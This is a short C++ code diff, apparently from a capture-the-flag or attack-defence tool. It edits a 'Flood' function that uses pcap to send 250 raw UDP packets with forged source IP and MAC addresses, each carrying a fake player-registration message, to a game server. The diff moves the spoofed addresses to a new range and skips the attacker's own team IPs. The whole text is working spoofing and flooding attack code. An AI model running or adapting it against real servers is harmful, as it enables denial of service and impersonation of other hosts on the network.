@@ -109,7 +109,12 @@ void CommandManager::Flood(std::string message) {
 
   for (size_t i = 0; i < 250; i++) {
     sprintf_s(payload, "Register  TOTALLY\nLEGIT\nPLAYER\n%d,Guy,Fawkes,0", i);
-    sprintf_s(ip, "10.0.0.%d", i);
+    sprintf_s(ip, "164.11.80.%d", i);
+
+    if (IsTeamIp(ip)) {
+      continue;
+    }
+
     u_int length = strlen(payload);
     u_char* packet = (u_char*) malloc(length + header_length);
 
@@ -117,7 +122,7 @@ void CommandManager::Flood(std::string message) {
     memcpy(message, payload, length);
 
     WriteUdp(length, packet, (client_port + i), server_port, server_mac,
-             (char*) "1337420b142e", ip, strdup(server_ip.c_str()));
+             (char*) "aabbccddeeff", ip, strdup(server_ip.c_str()));
 
     if (pcap_sendpacket(pcap, packet, length + header_length) != 0) {
       std::cout << "Error sending packet: " << pcap_geterr(pcap) << std::endl;
